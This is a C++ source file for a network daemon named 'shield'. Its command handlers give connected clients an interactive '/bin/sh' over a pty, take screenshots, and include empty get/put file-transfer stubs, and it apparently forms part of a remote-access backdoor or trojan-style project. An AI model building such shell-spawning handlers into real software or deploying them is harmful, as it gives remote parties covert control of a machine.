#include <sstream>
#include <pty.h>
#include <unistd.h>
#include <fcntl.h>
#include <cstring>
#include "DaemonServer.hpp"
#include "qio.h"

#include "cmds/screenshot.inc.cc"

int shield_cmd_help(client_t *client, [[maybe_unused]] DaemonServer *server, const char *args)
{
	if (!args || !*args)
	{
		for (int i = 0; commands[i].command != NULL; ++i)
		{
			client->output_buffer.append(commands[i].usage);
			client->output_buffer.append(": ");
			client->output_buffer.append(commands[i].description);
			client->output_buffer.push_back('\n');
		}
		return (0);
	}

	std::string option;
	std::istringstream argstream(args);
	argstream >> option;
	for (int i = 0; commands[i].command != NULL; ++i)
	{
		if (option == commands[i].command)
		{
			client->output_buffer.append("Usage: ");
			client->output_buffer.append(commands[i].usage);
			client->output_buffer.push_back('\n');

			client->output_buffer.append("Description: ");
			client->output_buffer.append(commands[i].description);
			client->output_buffer.push_back('\n');

			return 0;
		}
	}

	client->output_buffer.append("Command not found: ");
	client->output_buffer.append(option);
	client->output_buffer.push_back('\n');

	return (-1);
}

// Summon a shell for the client
int	shield_cmd_shell(client_t *client, DaemonServer *server, const char *args)
{
	(void) args; // unused parameter
	int master_fd, pid;

	DEBUG("Spawning shell for client %d\n", client->index);
	qio_data.shells_launched++;
	pid = forkpty(&master_fd, NULL, NULL, NULL);

	if (pid < 0)	//Error
		return (1);
	if ( pid == 0)
	{
		char *argv[] = {(char *)"sh", (char *)"-i", NULL};
		char *envp[] = {NULL};
		execve("/bin/sh", argv, envp);

		MERR("execve failed");
		exit(1);
	}

	if (fcntl(master_fd, F_SETFL, O_NONBLOCK) < -1)
	{
		MERR("fcntl on pty failed");
		close(master_fd);
		return (1);
	}

	DEBUG("finding slot for pty fd in pollfd array\n");
	for (size_t j = 0; j < MAX_FD; j++)
	{
		DEBUG("pollfd slot %zu: type %d\n", j, server->poll_metadata[j].fd_type);
		if (server->poll_metadata[j].fd_type == FD_UNUSED)
		{
			DEBUG("Linking pty fd %d to client %d\n", master_fd, client->index);
			server->pollfd_array[j].fd = master_fd;
			server->pollfd_array[j].events |= POLLIN;
			server->poll_metadata[j].client_index = client->index;
			server->poll_metadata[j].fd_type = FD_CLIENT_PTY;
			break;
		}
	}
	client->pty_fd = master_fd;
	return (0);
}

int	shield_cmd_screenshot(
	[[maybe_unused]] client_t *client,
	[[maybe_unused]] DaemonServer *server,
	[[maybe_unused]] const char *args
) {
	const char *result = shield_screenshot();
	if (std::strncmp(result, "ERROR|", 6) != 0)
	{
		client->output_buffer.append("Successfully took screenshot, saved to ");
		client->output_buffer.append(result);
		client->output_buffer.push_back('\n');
	}
	else
	{
		client->output_buffer.append("Failed to take screenshot: ");
		client->output_buffer.append(result);
		client->output_buffer.push_back('\n');
	}
	return (0);
}

int	shield_cmd_get(client_t *client, DaemonServer *server, const char *args)
{
	(void) client; // unused parameter
	(void) server; // unused parameter
	(void) args; // unused parameter
	return (0);
}

int	shield_cmd_put(client_t *client, DaemonServer *server, const char *args)
{
	(void) client; // unused parameter
	(void) server; // unused parameter
	(void) args; // unused parameter
	return (0);
}
